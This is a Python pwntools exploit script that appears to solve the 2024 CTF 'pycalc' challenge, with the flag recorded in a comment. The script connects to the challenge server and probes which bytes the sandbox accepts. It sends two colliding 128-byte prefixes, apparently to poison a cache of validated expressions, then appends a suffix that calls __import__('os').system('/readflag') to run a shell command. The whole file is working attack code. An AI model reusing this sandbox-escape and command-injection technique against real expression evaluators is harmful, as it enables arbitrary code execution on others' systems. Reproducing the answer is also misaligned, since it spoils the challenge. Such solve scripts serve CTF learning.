#!/usr/bin/env python3
from pwn import *


def connect():
    return remote("pycalc.2024.ctfcompetition.com", 1337)


def gen_alphabet(tube):
    good = bytearray()
    tube.recvuntil(b"> ")
    for b in range(256):
        if b in (10, 13, 19):  # avoid desyncs
            continue
        bb = bytes((b,))
        tube.sendline(b'b"A' + bytes(good + bb) + b'A"[-2]')
        reply = tube.recvuntil(b"> ")
        if ("\r\n" + str(b) + "\r\n\r> ").encode() not in reply:
            continue
        tube.sendline(b'b"A' + bytes(good + bb) + b'A"[-3]')
        reply = tube.recvuntil(b"> ")
        if ("\r\n" + str((b"A" + good)[-1]) + "\r\n\r> ").encode() not in reply:
            continue
        good.append(b)
    with open("alphabet", "wb") as fp:
        fp.write(good)


def main():
    with open("final_collision1.txt", "rb") as fp:
        prefix1 = fp.read()
    with open("final_collision2.txt", "rb") as fp:
        prefix2 = fp.read()
    assert len(prefix1) == 128
    assert len(prefix2) == 128
    assert prefix1.startswith(b'b"')
    assert prefix2.startswith(b'b"')
    for i in range(128):
        if prefix1[i] != prefix2[i]:
            break
    else:
        raise RuntimeError()
    suffix = (
        f'"[{i - 2}] - {prefix2[i]} or __import__("os").system("/readflag")'.encode()
    )
    with connect() as tube:
        if False:
            gen_alphabet(tube)
            return
        tube.sendlineafter(b"> ", prefix1 + suffix)
        tube.sendlineafter(b"> ", prefix2 + suffix)
        tube.interactive()
        # CTF{Ca$4_f0r_d3_C4cH3_Ha5hC1a5h}


if __name__ == "__main__":
    main()
